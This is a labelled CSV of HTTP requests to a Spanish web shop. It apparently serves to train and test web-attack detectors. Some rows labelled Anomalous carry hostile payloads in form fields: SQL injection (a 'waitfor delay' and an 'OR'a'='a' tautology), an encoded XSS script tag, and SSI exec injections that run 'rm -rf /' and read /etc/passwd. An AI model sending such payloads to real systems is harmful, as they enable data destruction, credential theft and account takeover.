label,method,url,http_version,host,user_agent,pragma,cache_control,accept,accept_encoding,accept_charset,language,cookie,content_type,content_length,connection,body,classification
Normal,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=fax&pwd=r-evu4lo&remember=off&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=468399A4FF669777A7775B1D95601194,,,close,,0
Anomalous,POST,/tienda1/publico/anadir.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=367DB629629C396150D8E73B9BAE18BC,application/x-www-form-urlencoded,Content-Length: 70,Connection: close,id=2&nombre=Vino+Rioja&precio=39%2F&cantidad=47&B1=A%F1adir+al+carrito,1
Anomalous,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=3A3B11C24BB782D04493D96D7513310C,application/x-www-form-urlencoded,Content-Length: 297,Connection: close,modo=registro&login=wallace&password=tucurpilla&nombre=Juanita&apellidos=Simonetti+Campam%E0&email=mowery%40sayuela.ph&dni=49682962H&direccion=Sicilia+159+&ciudad=Alcubillas&cp=08736&provincia=Ja%E9n&ntc=3071106416830045&B1=Registrar%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
Anomalous,GET,/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%2500,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9E6E6C25622CCFF255CC7116DFF8D57B,,,close,,1
Anomalous,POST,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C3A02D6AD676872EDE2711999A25E991,application/x-www-form-urlencoded,Content-Length: 265,Connection: close,modo=registro&login=ircbellc&password=c6ma2&nombre=Macarena&apellidos=Raynal+Santini&email=vesota%40autoescuelavilla.fm&dni=87351797M&direccion=Calle+Lachambre+Dominguez%2C+27%2C+13%3FD&ciudad=*Valverdejo&cp=39212&provincia=Sevilla&ntc=9974355200418178&B1=Registrar,1
Normal,POST,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=EA44BB0EDD4FC7FB456F0746758CB98B,application/x-www-form-urlencoded,Content-Length: 262,Connection: close,modo=registro&login=carlie&password=DespLUMe&nombre=Robina&apellidos=Cabana+Demuner&email=venezianti%40enigmatico.mu&dni=35715294C&direccion=Calle+Virgen+De+La+Estrella%2C+196+&ciudad=Plasencia+de+Jal%F3n&cp=37650&provincia=Lugo&ntc=1059050002779044&B1=Registrar,0
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=galluzzi&passwordA=3nt7epa3es&nombre=Laurentino&apellidos=Arteaga+Manzanares&email=neol%40barnicesuv.museum&dni=18445968Z&direccion=Calle+Beato+Nicolas+Factor+76%2C+&ciudad=Ballesteros+de+Calatrava&cp=46148&provincia=Zamora&ntc=1294969325590040&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=5DAD35226B3E31BF4E7144A6B4B1892A,,,close,,1
Normal,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0B75C560A4A329BB5A5D96E0B4343B39,application/x-www-form-urlencoded,Content-Length: 237,Connection: close,modo=registro&login=brittni&password=tr11quil67321e&nombre=Doreteo&apellidos=Dennett&email=miles_detmers%40sotelink.vu&dni=30573468M&direccion=Uribitarte+72+13%3FG&ciudad=Pravia&cp=24893&provincia=Madrid&ntc=0592934033194730&B1=Registrar,0
Anomalous,GET,/tienda1/publico/caracteristicas.jsp?idA=2,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=2C46770E6A963F916B1794BC0C5D0A48,,,close,,1
Anomalous,POST,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=248BB62DA2B23DE9CFB0468036E0DAA7,application/x-www-form-urlencoded,Content-Length: 41,Connection: close,modo=insertar&precio=5506&B1=Confirmar%2F,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=fulmer&password=amBaS&nombre=Sheila&apellidos=Mata+Hita&email=capers%40innovaris.fr&dni=96616229Z&direccion=Carrer+Panama%2C+27+8E&ciudad=Masroig%2C+El&cp=16813&provincia=Teruel&ntc=7137970068268248&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=75152DB6318A660238F0E8C619E1F5C0,,,close,,0
Anomalous,POST,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=82A0E73D6650429101C9A4D086CAFDBB,application/x-www-form-urlencoded,Content-Length: 242,Connection: close,modo=registro&login=tsolas+&password=c3763ativa.m4n3e&nombre=Frida&apellidos=Llagostera+Llaveria&email=cockneys%40drae2.tl&dni=11939364H&direccion=Calle+Alava+17+12%3FC&ciudad=Sada&cp=25139&provincia=Zaragoza&ntc=3664449984112984&B1=Registrar,1
Anomalous,GET,/postinfo.html,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=5DC980004F57366C49897D83D6DFD048,,,close,,1
Anomalous,POST,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=EF96D7FCF433FBBD5B2E845A5B2BC584,application/x-www-form-urlencoded,Content-Length: 58,Connection: close,modo=%2B&login=befanis&pwd=PiSoneAR&remember=off&B1=Entrar,1
Normal,GET,/tienda1/imagenes/3.gif,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=329DAC33BAADBDB0430E702BD6B1C227,,,close,,0
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=1467&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0B4C3ACF246FE997590A7ABC77130FFB,,,close,,0
Anomalous,POST,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=15C6D9C0A9C9B07DAE5DAC5437D54856,application/x-www-form-urlencoded,Content-Length: 39,Connection: close,modoA=insertar&precio=7525&B1=Confirmar,1
Normal,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=3934A4B1E494FE2C8C3D845E863CDFC2,application/x-www-form-urlencoded,Content-Length: 270,Connection: close,modo=registro&login=jamaal&password=CuLMinAR&nombre=Yasm&apellidos=Porquet+Camarillo&email=rapaport.iloloubek%40ajuntamentbarcelona20.com&dni=11901410Z&direccion=Calle+Calderon+De+La+Barca%2C+141+&ciudad=Huelva&cp=43761&provincia=Madrid&ntc=3409473973742176&B1=Registrar,0
Anomalous,GET,/tienda1/asf-logo-wide,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B642C90A3034D38523062BBD4DB6E4A4,,,close,,1
Anomalous,POST,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=30E97C217F2B2EB7260FE9E24B6DBE5E,application/x-www-form-urlencoded,Content-Length: 67,Connection: close,modo=entrar&login=balak*%3Fris&pwd=mu%21stIA&remember=off&B1=Entrar,1
Normal,POST,/tienda1/publico/vaciar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=CDE9842A0D0024C8BEA3C245035B1662,application/x-www-form-urlencoded,Content-Length: 17,Connection: close,B2=Vaciar+carrito,0
Anomalous,POST,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=538C15E79D28283A610CD7E007108EA0,application/x-www-form-urlencoded,Content-Length: 136,Connection: close,modo=entrar&login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=diLigEncia&remember=off&B1=Entrar,1
Anomalous,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=403B8E4964734DBBD9C0CC3E865BA546,application/x-www-form-urlencoded,Content-Length: 265,Connection: close,modo=registro&login=tsuji&password=envergonzado&nombre=Stylianos&apellidos=Franco+Vilamaj%F3&email=kraa%40pablobracamonte.ls&dni=65643274D&direccion=La+Pradera+131%2C+10E&ciudad=Burjassot&cp=18615&provincia=Zaragoza&ntc=1816581279872417%27OR%27a%3D%27a&B1=Registrar,1
Anomalous,POST,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F09BE41F1FE8DEFC62156D891CEB05E1,application/x-www-form-urlencoded,Content-Length: 41,Connection: close,modo=insertar%3F&precio=9014&B1=Confirmar,1
Anomalous,POST,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=DF5E656B818ED6B223B726333889E7E3,application/x-www-form-urlencoded,Content-Length: 64,Connection: close,modoA=entrar&login=simon-ch&pwd=Sur%3FTidO&remember=on&B1=Entrar,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=%2B&login=wingo1&pwd=1esm7n8h8r&remember=on&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=15F832B74470FC4AB3441EF4FB6A41E8,,,close,,1
Normal,GET,/tienda1/global/creditos.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=7707A806CA3CA0CF6F7742912434306D,,,close,,0
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=nugent&password=caNgreNaRsE&nombre=Pablo+de+la+Cruz&apellidos=De+Jongh+Algarra&email=jorey%4020horas.ao&dni=37200229Y&direccion=Carrer+Marcos+Redondo%2C+132%2C+8%3FF&ciudad=Piqueras&cp=48031&provincia=Tarragona&ntc=5359941637472612&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D069060CEA531E625B69CC8437981CF0,,,close,,0
Anomalous,GET,/IISSamples/sdk/asp/database/LimitRows_VBScript.asp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=53029224E06F0F3E82923B57CC4C61BE,,,close,,1
Normal,POST,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=E7A61B5F18ACB7BEA2464F93AD6C6B34,application/x-www-form-urlencoded,Content-Length: 4,Connection: close,id=2,0
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=5316&B1=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F389597E56081CE7EFAA1A3AB4E83FEF,,,close,,0
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=2637&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=8FEAE9F811159620280A2030F46AAF40,,,close,,0
Normal,GET,/tienda1/miembros/fotos.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B194EB59B2C8BB68A9912B3CABD972C4,,,close,,0
Anomalous,POST,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=ABCD87C9A9890DDD471B282DB42C99E5,application/x-www-form-urlencoded,Content-Length: 72,Connection: close,modo=entrar&login=lollis&pwd=s%27%2Fab%2Fa%F1%F3n&remember=off&B1=Entrar,1
Normal,GET,/tienda1/global/creditos.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=841C61D9D8FCB3E2B0996E73C602069C,,,close,,0
Anomalous,GET,/tienda1/imagenes/1.gif.Bak,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=EFC170CEBE3A6C08F2E382F32838003A,,,close,,1
Normal,GET,/tienda1/imagenes/3.gif,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=F0AE8A55B54A3F8C5546E8FBE7B9F69B,,,close,,0
Anomalous,GET,/tienda1.old,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=E2D7451BD8E1CE01A4F366A12501ED3B,,,close,,1
Anomalous,POST,/tienda1/publico/vaciar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=84A45B7B218A7AF4AB9608DAA5546463,application/x-www-form-urlencoded,Content-Length: 18,Connection: close,B2A=Vaciar+carrito,1
Anomalous,POST,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=7CF68FDBD731FE2061FBBCC8101952F9,application/x-www-form-urlencoded,Content-Length: 62,Connection: close,modo=entrar&login=mincey&pwd=deSANiDAR&rememberA=off&B1=Entrar,1
Anomalous,POST,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=144A553D1BA2E93CB4B6C610279B3936,application/x-www-form-urlencoded,Content-Length: 41,Connection: close,modo=insertar&precio=7144&B1=Confirmar%2F,1
Normal,GET,/tienda1/miembros/imagenes/castro.jpg,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D25687B39FF68E4FC10BD59AC1645780,,,close,,0
Anomalous,POST,/tienda1/publico/anadir.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=8121984C9241E35D65ECDBB52BEC92AA,application/x-www-form-urlencoded,Content-Length: 74,Connection: close,id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=65&B1=A%F1adir+al+carrito,1
Anomalous,POST,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C6F829F3D0CA45483C1ACF53B3BF2B7F,application/x-www-form-urlencoded,Content-Length: 104,Connection: close,modo=insertar%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&precio=5191&B1=Confirmar,1
Anomalous,POST,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9EA7762C44165EF3985EC817C39A9375,application/x-www-form-urlencoded,Content-Length: 97,Connection: close,modo=entrar&login=wylie&pwd=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&remember=off&B1=Entrar,1
